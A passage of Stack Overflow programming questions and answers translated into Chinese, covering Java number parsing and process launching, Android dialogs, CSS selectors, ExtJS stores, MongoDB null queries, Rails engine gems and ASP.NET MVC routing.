> 时间：2014-06-30T08:54:15.453

此解决方案仅在您寻求前进时才有效。如果您希望它向后搜索，则必须验证 videoTimeOffset 是否为负：

```
var lastUnixTimeStamp;
var lastCurrentVideoTime;

videoplayer.addEvent('timeupdate',function(){

if( !lastUnixTimeStamp && !lastCurrentVideoTime ){  //not defined at first timeupdate event
     lastUnixTimeStamp = new Date().getTime();
     lastCurrentVideoTime = videoplayer.currentTime;
     return;
}

var videoTimeOffset = videoplayer.currentTime - lastCurrentVideoTime;  //how many milliseconds was video running
var realTimeOffset = new Date().getTime() - lastUnixTimeStamp;  //how many milliseconds were real time running

//guess the numbers are not accurate, so if the difference between both is f.e. < 100ms, video runs normally 
if( (videoTimeOffset - realTimeOffset) > 100 || (videoTimeOffset < 0 )){
   //do your seeking magic
}

lastUnixTimeStamp = new Date().getTime();
lastCurrentVideoTime = videoplayer.currentTime;

}) 
```

# iphone - 从 iphone 中的实时 URL 获取错误的背景图像

> ID：10685856
> 
> 赞同：2
> 
> 时间：2012-05-21T13:08:22.287
> 
> 标签：iphone, ios5

我正在尝试从具有透明背景的 URL 获取图像。

但是每当我尝试将它与 NSData 一起使用时，我都会得到黑色背景。

```
UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
NSData *imgageURL = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"Image URL"]]; 
UIImage *image = [UIImage imageWithData:imageURL];

[button setImage:image forState:UIControlStateNormal]; 
```

在按钮图像中，我得到了黑色背景而不是透明的。

如何从 URL 获取透明图像以工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:08:48.310

```
UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
[button setBackgroundColor:[UIColor clearColor]];
NSData *imgageURL = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"Image URL"]]; 
UIImage *image = [UIImage imageWithData:imageURL];
[button setImage:image forState:UIControlStateNormal]; 
```

只有背景颜色的问题。

或在 Photoshop 中打开接收图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:15:31.177

尝试使用 setBackgroundImage:buttonImage 而不是 setImage。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:12:17.543

首先，检查图像是否具有真正透明的背景（请提供图像 url）。是PNG图片吗？

其次，检查按钮的superview（以及它的superviews）的背景是什么颜色，可以将其设置为**[UIColor clearColor]**

希望能帮助到你

# android - 在 OnClickListener 中从 EditText 调用 getText 时发生空指针异常

> ID：10685861
> 
> 赞同：0
> 
> 时间：2012-05-21T13:08:28.293
> 
> 标签：android, android-widget

我有一个自定义对话框。当我单击“确定”时，我希望它从其 EditText 字段中获取文本。但是，它会引发空指针异常。

代码：

```
AlertDialog.Builder builder = new AlertDialog.Builder(this);
LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
View layout = inflater.inflate(R.layout.dialog_delivered, (ViewGroup)findViewById(R.id.llDeliveredDialog));

builder.setMessage("Dialog message");
builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int which) {
    final EditText text = (EditText)findViewById(R.id.etGivenTo);
    String value = text.getText().toString();
    }
});

builder.setCancelable(false);
builder.setView(layout);
builder.show(); 
```

XML 布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/llDeliveredDialog"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <EditText
        android:id="@+id/etGivenTo"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:ems="10" >

        <requestFocus />
    </EditText>

</LinearLayout> 
```

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-21T13:09:59.703

```
 final EditText text = (EditText)layout.findViewById(R.id.etGivenTo);
                                 ^^^^^^ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:11:14.227

```
builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int which) {
    final EditText text = (EditText)layout.findViewById(R.id.etGivenTo); 
    String value = text.getText().toString();
    }
}); 
```

# java - 不同的舍入方法似乎不起作用

> ID：10685863
> 
> 赞同：2
> 
> 时间：2012-05-21T13:08:29.960
> 
> 标签：java, floating-point, double, rounding

以下代码：

```
 DecimalFormat df = new DecimalFormat();
    df.setMinimumFractionDigits(2);

    int zahl1 = 10;
    int zahl2 = 18;

    double double1 = zahl1 / zahl2;
    System.out.println("Double1 = " + df.format(double1));

    double double2 = Math.ceil(zahl1 / zahl2);
    System.out.println("Double2 = " + df.format(double2));

    double double3 = Math.round((zahl1 / zahl2) * 100) / 100;
    System.out.println("Double3 = " + df.format(double3));

    float float1 = Math.round((zahl1 / zahl2) * 100) / 100;
    System.out.println("Float1  = " + df.format(float1));

    long long1 = zahl1 / zahl2;
    System.out.println("long1 = " + df.format(long1));

    long long3 = Math.round((zahl1 / zahl2) * 100) / 100;
    System.out.println("long3 = " + df.format(long3)); 
```

呈现以下输出：

```
Double1 = 0,00
Double2 = 0,00
Double3 = 0,00
Float1  = 0,00
long1 = 0,00
long3 = 0,00 
```

我现在读了很多关于浮点数和双精度数以及 Java 中没有的内容，但我似乎并不完全理解如何达到我想要的 0.6 的结果。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-21T13:10:44.110

由于`zahl1`和`zahl2`属于 类型`int`，因此以下内容：

```
double double1 = zahl1 / zahl2; 
```

使用*整数除法*，其结果为`0`.

将结果分配给 type 的变量并不重要`double`：（整数）除法首先发生，然后其结果扩大到 a `double`。

要修复，将该行更改为：

```
double double1 = zahl1 / (double)zahl2; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T13:10:53.673

将整数除以另一个整数以浮动时，您必须强制转换：

`(float)zahl1 / (float)zahl2`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-21T13:12:47.660

您应该查看[BigDecimal](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigDecimal.html)类，该类提供 ROUND_HALF_DOWN 等功能以确保精度。

# css - 关于选择嵌套元素的两种不同 CSS 语法的困惑

> ID：10685865
> 
> 赞同：2
> 
> 时间：2012-05-21T07:18:30.797
> 
> 标签：css, css-selectors

> **可能重复：**
> [CSS 规则中的“>”是什么意思？](https://stackoverflow.com/questions/3225891/what-does-mean-in-css-rules)

CSS 有以下两种语法，它们似乎在做同样的事情。选择嵌套元素。

```
div span

div > span 
```

我是否遗漏了什么，或者这两个确实是等效的选择器？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-21T13:10:29.493

不，它们不相等。第一个是[后代选择器](http://www.w3.org/TR/CSS2/selector.html#descendant-selectors)，而第二个是[子选择器](http://www.w3.org/TR/CSS2/selector.html#child-selectors)。

快速示例：

```
<div class="a">
  <div class="b">
    <div class="c"></div>
  </div>
</div> 
```

使用此标记`.a > .c`将不选择任何内容，而`.a .c`将`.a > .b > .c`选择最里面的元素。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T13:12:27.817

```
div span 
```

将选择任何 div 内的任何跨度。这可能是多个层次的深度。

```
div > span 
```

只会选择任何作为 div 的直接后代的跨度。有关子选择器的更多信息-> [http://meyerweb.com/eric/articles/webrev/200006b.html](http://meyerweb.com/eric/articles/webrev/200006b.html)

# actionscript-3 - 灵活在 ApplicationInstance(applicationInstance.systemManager.rawchildren) 中找到警报对象的位置

> ID：10685866
> 
> 赞同：1
> 
> 时间：2012-05-21T13:08:44.260
> 
> 标签：actionscript-3, apache-flex, actionscript, flex4, flex3

由于我的一个窗口弹出了一个警报并关闭了，所以我没有要关闭它的警报对象。找到使用 applicationInstance.systemManager.rawchildren 的解决方案。但是我在哪里可以找到 childList 中的警报对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:25:01.407

这是你想做的一个小蛮力方法。您可以做的只是循环遍历 rawChildren 列表并检查其中一个孩子是否来自 Alert 类型。

```
for(var i:uint = 0; i < rawChildren.numChildren; i++)
{
     if( rawChildren.getChildAt(i) is Alert )
     {
          //magic goes here
     }
} 
```

如果您的应用程序在一个位置打开警报会更好。表示您传递事件或评论（取决于您的应用程序框架）以显示错误。这样只有一个控制器可以打开/控制警报。

# ruby-on-rails-3 - 无法在引擎中加载 gem

> ID：10685870
> 
> 赞同：1
> 
> 时间：2012-05-21T13:08:53.620
> 
> 标签：ruby-on-rails-3, rubygems, runtime-error, rails-engines

我有一个利用`savon`gem 的引擎。当我在引擎中运行虚拟应用程序时`/test`，一切正常，但是当我尝试在我的应用程序中将它作为引擎安装并运行时，我收到错误：

```
`require': no such file to load -- savon (LoadError) 
```

我曾经通过添加`require "savon"`到使用它的模型顶部来包含`soap_model.rb`它。根据[这篇](https://stackoverflow.com/questions/753383/rails-cant-find-image-magick-gem)文章，我不应该将它添加到模型中，但是`environment.rb`. 启动服务器时似乎没有`environment.rb`运行，因为它只是产生了一个新错误

```
uninitialized constant EngineName::SOAP::Savon 
```

所以我将它添加到初始化程序中，当尝试使用`rails s`.

环境：

```
Mac OS 10.7.3
ruby 1.9.2p290 (2011-07-09 revision 32553) [x86_64-darwin11.3.0]
Rails 3.1.4
savon (0.9.9) 
```

注意：我当然已经确保 bundle install 正确运行，并重新启动了服务器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T17:04:39.660

我不知道为什么 Gem 表现得如此怪异，但您可以尝试该代码：

*您必须首先**要求**然后**包含**它。*

```
# config/initializers/application.rb
require 'savon'

include EngineName::SOAP::Savon 
```

希望能帮助到你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-23T10:09:28.120

gem 包含在引擎 Gemfile 中，但没有作为依赖项添加到 gemspec 中，因此`bundle install`在主应用程序中运行时它不包含在内。

将此添加到`enginename.gemspec`

```
s.add_dependency "savon" 
```

使一切正常。

它在虚拟应用程序中工作的原因是它与引擎共享 Gemfile。

# java - weblogic设置和javascript

> ID：10685878
> 
> 赞同：0
> 
> 时间：2012-05-21T13:09:23.043
> 
> 标签：java, javascript, performance, weblogic

我在 UNIX 机器上的 weblogic 上部署了一个 Web 应用程序。该应用程序还部署在我的本地和另一个带有 weblogic 的旧 UNIX 机器上。在我的本地机器和旧机器上，该应用程序运行良好。但是在新服务器上，应用程序非常慢，并且 Javascript 功能不能很好地工作。什么设置会导致这样的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:38:05.923

这也可能是由于新的 unix box 的配置。在升级我们的 sun sol box 时，我遇到了类似的性能问题。您将不得不与您的管理员交谈以调整您的 unix box 配置设置以使用您的 weblogic 实例，反之亦然。对我们来说，这归结为新太阳盒的芯片架构，这导致了性能的显着差异。我建议您查看您的 Weblogic 版本支持的配置，并将其与您的新 unix 框进行比较，然后从那里开始。

这是Weblogic 9.1 及其支持配置的[链接。](http://docs.oracle.com/cd/E13196_01/platform/suppconfigs/configs91/91_over/overview.html)

# java - 使用 HttpUnit 发送带有 POST 请求的文件

> ID：10685883
> 
> 赞同：3
> 
> 时间：2012-05-21T13:09:44.953
> 
> 标签：java, rest, testing, http-unit

我们有一个 REST 服务，我们想对其进行测试。我考虑过为此目的使用 HttpUnit。我们向资源 URL 发送 POST 请求，并在收到请求后从请求中检索文件。在我们的服务器代码中，我们有这样的东西：

```
MultipartFormData body = request().body().asMultipartFormData();
FilePart file = body.getFile("upfile");
File pictureFile = file.getFile(); 
```

在我的测试中，我写道：

```
WebConversation wc = new WebConversation();
WebRequest wr = new PostMethodWebRequest("http://linkToOurResource");
File f = new File("testFile.jpg");
wr.selectFile("upfile", f, "multipart/form-data;");
    WebResponse response = wc.getResponse(wr); 
```

但我收到以下错误：

```
Test functional.AcceptanceTests.testAddingNewClient failed: Parameter 'upfile' is not a file parameter and may not be set to a file value. 
```

任何建议如何将 POST 请求中的文件发送到我们的服务器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T23:11:38.810

您可能想阅读 httpunit 开发人员常见问题解答 - 只需搜索 httpunit 的单元测试即可找到合适的源代码示例：

[https://sourceforge.net/mailarchive/forum.php?thread_name=5051BBF6.70700%40bitplan.com&forum_name=httpunit-develop](https://sourceforge.net/mailarchive/forum.php?thread_name=5051BBF6.70700%40bitplan.com&forum_name=httpunit-develop)

# extjs - 第一次从 JSON 响应加载时，Ext JS 为空 ItemSelector

> ID：10685886
> 
> 赞同：-1
> 
> 时间：2012-05-21T13:09:55.163
> 
> 标签：extjs, extjs4, ext4, jsonstore, itemselector

我正在使用 extjs 4 使用 Itemselector 创建一个表单。我正在使用 Json 存储我的 JSON 响应如下：

```
{"items":[{"id":"12","name":"Cable"},{"id":"8","name":"Document"},{"id":"1","name":"Equipment"},{"id":"2","name":"Instrument"},     {"id":"10","name":"Isometric"},{"id":"11","name":"Joint"},{"id":"4","name":"Line"},{"id":"3","name":"LineSeg"},{"id":"5","name":"Specialty"},{"id":"6","name":"Spool"},{"id":"7","name":"Valve"},{"id":"9","name":"Weld"}]} 
```

我的表格

```
Ext.require([
        'Ext.ux.form.MultiSelect',
        'Ext.ux.form.ItemSelector'
        ]);

Ext.define('MyAPP.view.directory.MyForm', {
    extend: 'Ext.form.Panel',
alias:'widget.myform',
    border: false,
    split: true,
bodyPadding: 5,
lableWidth:30,
autoScroll : true,
defaults: {
    anchor: '100%'

},
defaultType: 'textfield',
items: [
    {
xtype:'fieldset',
title: 'Commodities',
collapsible: true,
border:0,
defaultType: 'textfield',
defaults: {anchor: '100%'},
layout: 'anchor',
items :[
      {
        xtype: 'itemselector',
        name: 'commoselector',
        id:'commoselector',
        listAvailable:'',
        listSelected:'',
        fieldLabel: '',
        imagePath: 'extjs407/ux/css/images/',
        store: Ext.create('MyAPP.store.CommodityStore'),
        displayField: 'name',
        valueField: 'id',
        //value: ['9'],
        //allowBlank: false,
        msgTarget: 'under'
      }
 ]
},

 initComponent: function () {
    this.callParent(arguments);
}
}); 
```

我的商店

```
 Ext.define('MyAPP.store.CommodityStore', {

  extend: 'Ext.data.Store',

 constructor: function(cfg) {

 var me = this;
 cfg = cfg || {};
 me.callParent([Ext.apply({
     autoLoad: true,
     autoDestroy: true,
     storeId: 'CommodityStore',
     proxy: {
        type: 'ajax',
        url: 'getCommodityList',
        reader: {
            type: 'json',
            root: 'items'
        }
    },
    fields: [
            {name: 'id'},
            {name: 'name'}
    ]
   }, cfg)]);
  }
   }); 
```

当表单创建时，尽管 JSON 是正确的，但它没有加载空白存储。哪里做错了？请帮忙。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T14:02:05.257

您不需要像在中那样手动创建商店`store: Ext.create('MyAPP.store.CommodityStore'),`

你通常做的只是放置`store: 'CommodityStore'`，ExtJs 会自动完成其余的工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-22T08:24:22.090

```
initComponent: function () {
var me = this;
Ext.applyIf(me, {
    listeners: {
    beforerender: {
            fn: me.onFormBeforeRender,
            scope: me
        }
   }
});

me.callParent(arguments);

},

onFormBeforeRender: function(abstractcomponent, options) {
        // where store is created globally like this var store =          Ext.create('TIP.store.CommodityStore');

store.load(function(){
    Ext.getCmp("commoselector").bindStore(store);
});
} 
```

并在商店 autoLoad:false

# c# - 显示在多行上的可编辑（包括插入）数据源

> ID：10685889
> 
> 赞同：0
> 
> 时间：2012-05-21T13:10:07.277
> 
> 标签：c#, .net, crud

我有一个 Web 应用程序 (C#) 要求，其中用户需要对一组数据进行插入、更新、取消编辑和删除 (CRUD) 功能。由于字段的数量，数据源的一条记录必须显示在两（或三）行上。GridView 似乎无法提供跨行的能力；DataList 没有插入功能。我发现一个可扩展的 GridView 示例没有可编辑的内容。我尝试了多种方法来使用多种类型的控件来实现此要求，但均未成功。任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:19:40.883

DataGrid 应该给你你需要的东西。您可以使用 TemplateColumns 来定义给定单元格在页面上的呈现方式。

此链接为您提供所需的信息。 [http://www.asp.net/web-forms/tutorials/data-access/custom-formatting/using-templatefields-in-the-gridview-control-cs](http://www.asp.net/web-forms/tutorials/data-access/custom-formatting/using-templatefields-in-the-gridview-control-cs)

如果这不能为您提供足够的灵活性，那么 DataRepeater 控件将为您提供完全控制，从而允许您呈现自己的网格。

# mongodb - 如何使用 C# 官方驱动创建具有 Null 值的 Bson 文档？

> ID：10685890
> 
> 赞同：9
> 
> 时间：2012-05-21T13:10:09.487
> 
> 标签：mongodb, mongodb-.net-driver

我有 3 个字符串字段 Country、Province、City 的对象。它们可以包含 null 或一些字符串名称。

我想用完全相同的值查询所有数据。

例如，我需要所有数据

```
City = null,
Province = "WA",
Country = "USA" 
```

我创建了 BsonDocument：

```
var lookup = new QueryDocument
{
    {"GeoPosition.City", userLocation.City},
    {"GeoPosition.Province", userLocation.Province},
    {"GeoPosition.Country", userLocation.Country}
}; 
```

但是 null 字段被丢弃了，文档看起来像：

```
{
    "GeoPosition.Province" : "WA",
    "GeoPosition.Country" : "USA"
} 
```

如果我想使用

```
Query.EQ("GeoPosition.City", userLocation.City) 
```

我有例外说参数不能为空。

正如我在文档中看到的，如果值等于 null，则构建查询检查没有问题。所以这是 C# 驱动程序的问题。任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-22T19:17:30.327

取决于您的城市变量的数据类型。如果城市变量是 BsonValue 类型，您可以使用 ?? 运营商直接：

```
BsonValue city = null;
var query = Query.EQ("city", city ?? BsonNull.Value);
Console.WriteLine(query.ToJson()); 
```

如果你的城市变量是字符串类型，你需要一个额外的转换来让编译器满意：

```
string city = null;
var query = Query.EQ("city", (BsonValue)city ?? BsonNull.Value);
Console.WriteLine(query.ToJson()); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T13:31:52.890

我假设您正在使用 BsonDocuments 而不是 C# 类。因此，对于空值，您需要使用 BsonNull.Value 来表示数据库和查询中的空值。

# java - 从文件位置运行 Java 中的 .exe 文件

> ID：10685893
> 
> 赞同：21
> 
> 时间：2012-05-21T13:10:21.567
> 
> 标签：java, windows, batch-file, exe, bufferedreader

我必须从我的 Java 程序中打开一个 .exe 文件。所以我首先尝试了以下代码。

```
Process process = runtime.exec("c:\\program files\\test\\test.exe"); 
```

但我遇到了一些错误。然后我发现必须从 c://program files/test/ 那个位置启动 exe，然后它才会打开而没有错误。所以我决定编写一个 .bat 文件并执行，以便它会 cd 到该位置并执行 .exe 文件。

以下是我的代码：

```
BufferedWriter fileOut;

String itsFileLocation = "c:\\program files\\test\\"
    System.out.println(itsFileLocation);
    try {
     fileOut = new BufferedWriter(new FileWriter("C:\\test.bat"));
     fileOut.write("cd\\"+"\n");
     fileOut.write("cd "+ itsFileLocation +"\n");
     fileOut.write("test.exe"+"\n");
     fileOut.write("exit"+"\n");

     fileOut.close(); // Close the output stream after all output is done.
    } catch (IOException e1) {
     e1.printStackTrace();
    } // Create the Buffered Writer object to write to a file called filename.txt
    Runtime runtime = Runtime.getRuntime();
    try {
     Process process =runtime.exec("cmd /c start C:\\test.bat");
    } catch (IOException e) {
     e.printStackTrace();
    } 
```

上面的代码完美运行。但是，命令提示符也在我的 .exe（应用程序）后面打开。它仅在 .exe 文件退出后关闭..

当我的应用程序统计信息时，我需要关闭我的命令提示符。

我的 .bat 文件在程序编写后将如下所示。

```
cd\
cd C:\Program Files\test\
test.exe
exit 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-21T13:18:50.190

你不需要控制台。您可以使用工作目录执行进程：

exec（字符串命令，字符串 [] envp，文件目录）

在具有指定环境和工作目录的单独进程中执行指定的字符串命令。

*   命令是 .exe 的位置
*   envp 可以为空
*   dir，是你的 .exe 的目录

关于您的代码，它应该是...

```
Runtime.getRuntime().exec("c:\\program files\\test\\test.exe", null, new File("c:\\program files\\test\\")); 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-21T13:16:28.630

您可以使用[Runtime.exec(java.lang.String, java.lang.String[], java.io.File)](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Runtime.html#exec%28java.lang.String,%20java.lang.String%5B%5D,%20java.io.File%29)在其中设置工作目录。

否则，您可以按如下方式使用[ProcessBuilder ：](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/ProcessBuilder.html)

```
ProcessBuilder pb = new ProcessBuilder("myCommand", "myArg1", "myArg2");
pb.directory(new File("myDir"));
Process p = pb.start(); 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-08-25T12:27:19.257

运行文件的另一种方法如下：

```
import java.awt.Desktop;
import java.io.File;

public static void open(String targetFilePath) throws IOException
{
    Desktop desktop = Desktop.getDesktop();

    desktop.open(new File(targetFilePath));
} 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-07-30T08:45:11.653

使用 java 通过命令行运行 bat 或任何其他的标准代码是：

```
runtimeProcess = Runtime.getRuntime().exec("cmd /c start cmd.exe /C\""+backup_path+"\"");
int processComplete = runtimeProcess.waitFor(); 
```

您可以使用 & 分隔符继续多个文件，例如： &&

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2018-09-29T17:38:24.623

这也行。

```
 Process process = new ProcessBuilder("C:\\Users\\test\\Downloads\\Termius.exe").start(); 
```

它将在该文件位置启动 .exe。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-05-12T18:11:11.067

运行exe文件的最佳方法

制作 java.awt.Desktop 对象和等于 Desktop.getDesktop();

`Desktop desktop = Desktop.getDesktop();` `desktop.open("file path");`

运行exe文件：

`desktop.open("C:\\Windows\\System32\\cmd.exe");`

或者

`desktop.open("C:/Windows/System32/cmd.exe");`

运行网址：

`desktop.browse(new URI("http://www.google.com"));`

# java - 与 Parse.com 比较日期

> ID：10685896
> 
> 赞同：6
> 
> 时间：2012-05-21T13:10:36.680
> 
> 标签：java, android, parse-platform

我正在尝试比较 ParseQuery 的一些日期。它不会给我错误，但它不会过滤日期。这是一些代码：

```
if(dateFrom!=null){
        query.whereLessThanOrEqualTo("from", dateFrom);
    }
    if(dateTo!=null){
        query.whereGreaterThanOrEqualTo("to", dateTo);
    } 
```

日期是 java.util.Date （不是 sql）

```
Date dateFrom = new Date(fromYear,fromMonth,fromDay,fromHour,fromMinute);

    Date dateTo = new Date(toYear,toMonth,toDay,toHour,toMinute); 
```

当我在 parse.com 上查看我的 ParseObjects 时，我看到这些对象有一个 dateFrom 和 dateTo。

谁能告诉我为什么它不过滤？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T07:39:50.323

我已经测试了日期比较与 Javascript SDK 一起使用。

（word是一个基本的解析模型）

```
var d = new Date();
var word = new Word();          
word.set("dateTo", new Date (2012, 01, 01));
word.save();        

var dateTo = new Date (2012, 12, 31);

var query = new Parse.Query(Word);
query.greaterThan("dateTo", dateTo);

query.find({
  success: function(results) {
    alert("Successfully retrieved " + results.length + " scores.");
  },
  error: function(error) {
    alert("Error: " + error.code + " " + error.message);
  }
}); 
```

作为一种解决方法，您始终可以将您的天数转换为像 Date.getTime() 这样的秒数，并使用整数进行比较。

问候

# sql-server-2008 - 默认服务器名称的连接字符串

> ID：10685897
> 
> 赞同：0
> 
> 时间：2012-05-21T13:10:38.517
> 
> 标签：sql-server-2008, connection-string

我有这个连接字符串

```
<add name="ApplicationServices" connectionString="Data Source=local;Initial Catalog=mycatalog;Integrated Security=True"
      providerName="System.Data.SqlClient"/> 
```

问题是我认为的数据源`local`是错误的，因为我不断收到此错误

```
A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: Named Pipes Provider, error: 40 - Could not open a connection to SQL Server) 
```

正确的连接字符串应该是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:16:16.487

利用

*   （当地的）
*   本地主机
*   .

没错，只是一个 ./dot

如果您愿意，请在 local 周围添加括号

# asp.net-mvc-3 - ASP.NET MVC 3 路由问题

> ID：10685898
> 
> 赞同：0
> 
> 时间：2012-05-21T13:10:38.703
> 
> 标签：asp.net-mvc-3, routing

在 asp.net mvc 中使用默认路由并使用 ActionLink 的结果

```
@Html.ActionLink("title", "Index", "Question", new { id = 25}, null) 
```

是 ：

```
http://localhost/question/index/25 
```

将链接更改为

```
http://localhost/question/25 
```

我在默认之前在 Global.asax 中添加了新的路由角色：

```
routes.MapRoute(
            "default2", // Route name 
            "Question/{id}", // URL with parameters
            new { controller = "Questions", action = "Index", id = UrlParameter.Optional} // Parameter defaults
        ); 
```

我对**用户、标签、....**有同样的问题，我应该为每个主题创建相同的角色吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:27:40.710

你试过这个吗？

```
 routes.MapRoute(
      "", 
      "{controller}/{id}",
      new { controller = "Home", action = "Index", id = UrlParameter.Optional } 
  ); 
```

**更新：**

如果`id`始终是整数，那么您可以在上述路由中放置一个简单的数字约束，以避免@Nick 报告的路由问题。

```
 routes.MapRoute(
      "my-route",
      "{controller}/{id}",
      new { controller = "Home", action = "Index", id = UrlParameter.Optional },
      new { id = @"\d*" }
  ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:59:49.717

我想我会更进一步，向您展示如何创建路由约束，这样您就不需要注册三个单独的路由。

使用以下文章作为指南，您可以创建一个约束，该约束将根据您将指定的控制器列表验证当前路由控制器：

[http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-custom-route-constraint-cs](http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-custom-route-constraint-cs)

所以这是我的带有路由约束的课程：

```
public class ControllerConstraint : IRouteConstraint
{
    private string[] _controllers;

    public ControllerConstraint() : this(null) { }
    public ControllerConstraint(string[] controllers)
    {
        _controllers = controllers;
    }

    #region IRouteConstraint Members
    public bool Match(HttpContextBase httpContext, Route route, string parameterName, RouteValueDictionary values, RouteDirection routeDirection)
    {
        string  currentController = values.ContainsKey("controller")?  values["controller"].ToString() : null;

        return _controllers != null //The list of controllers passed to the route constraint has at least one value in it
            && !String.IsNullOrEmpty(currentController) //The current route data has a controller in it to compare against
            && (from c in _controllers where c.Equals(currentController,StringComparison.CurrentCultureIgnoreCase) select c).ToList().Count > 0; //We find a match of the route controller against the list of controllers
    }
    #endregion
} 
```

从那里您需要做的就是修改在 Globa.asax 中注册路线的方式

```
 routes.MapRoute(
      "Action-less Route", // Route name
      "{controller}/{id}", // URL with parameters
      new { controller = "Questions", action = "Index", id = UrlParameter.Optional}, //Parameter defaults
      new {isController = new ControllerConstraint(new string[] {"Questions","Users","Tags"})} //Route Constraint
        ); 
```

您还可以更进一步，验证 {id} 是一个带有附加路由约束的数字，如下所示：

[http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-route-constraint-cs](http://www.asp.net/mvc/tutorials/controllers-and-routing/creating-a-route-constraint-cs)

# java - 导入 JAR 文件包名

> ID：10685904
> 
> 赞同：0
> 
> 时间：2012-05-21T13:10:45.153
> 
> 标签：java, import, jar

我对java很陌生，通过谷歌搜索我还没有找到答案。我有一个正确添加到我的类路径中的 JAR 文件。如果 jar 文件从来没有给过我，我怎么知道它的包名是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:13:31.927

jar 是一个普通的 zip 文件。打开这个文件并查看目录结构。

/org/apache/xyz/MyClass.class

将会

导入 org.apache.xyz.MyClass；

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:19:44.533

如果您使用的是 eclipse，当您键入一些您的类尚未导入的类/接口时，eclipse 会以红色突出显示。您只需要在它上面按 ctrl+1，就会出现一个列表，其中包含一些选项，例如

> 导入“**您尝试使用的类**”（**类的完整包路径**）

或者您可以参考该 jar 文档以了解要导入的包。底线是手动打字效率不高，ctrl+1 和 ctrl+shift+o 是您的朋友（如果您使用的是 Eclipse）。

# java - Java中的Integer.parseint，'+'首先出现时的异常

> ID：10685906
> 
> 赞同：9
> 
> 时间：2012-05-21T13:10:58.593
> 
> 标签：java

`Integer.parseInt("-1000");`返回 -1000 作为输出。

`Integer.parseInt("+500");`抛出异常。

我如何能够识别前面带有“+”符号的正数而无需修剪符号？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-21T13:17:07.240

尝试[`DecimalFormat`](http://docs.oracle.com/javase/7/docs/api/java/text/DecimalFormat.html)喜欢与模式`"+#;-#"`。它将处理显式签名解析。模式分解：

*   第一部分（之前`;`）是正面模式，它必须以`+`char开头
*   第二部分是否定的，必须以`-`字符开头

* * *

例子：

```
DecimalFormat df = new DecimalFormat("+#;-#");
System.out.println(df.parse("+500"));
System.out.println(df.parse("-500")); 
```

输出：

```
500
-500 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-21T13:13:04.170

一种选择是使用 Java 7... 假设其行为[与记录](http://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html#parseInt%28java.lang.String%29)的一样：

> 将字符串参数解析为有符号十进制整数。字符串中的字符必须都是十进制数字，除了第一个字符可以是ASCII减号'-'（'\u002D'）表示负值或ASCII加号'+'（'\u002B'）表示正值。

看起来这是 Java 7 中引入的一个新特性。[JDK 6](http://docs.oracle.com/javase/6/docs/api/java/lang/Integer.html#parseInt%28java.lang.String%29)文档仅表明已`-`处理。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-21T13:13:35.363

该方法的行为如文档中所述：

> 字符串中的字符必须都是十进制数字，除了第一个字符可以是 ASCII 减号“-”（“\u002D”）表示负值。

如果要`+`正确进行解析，则需要跳过第一个字符：

```
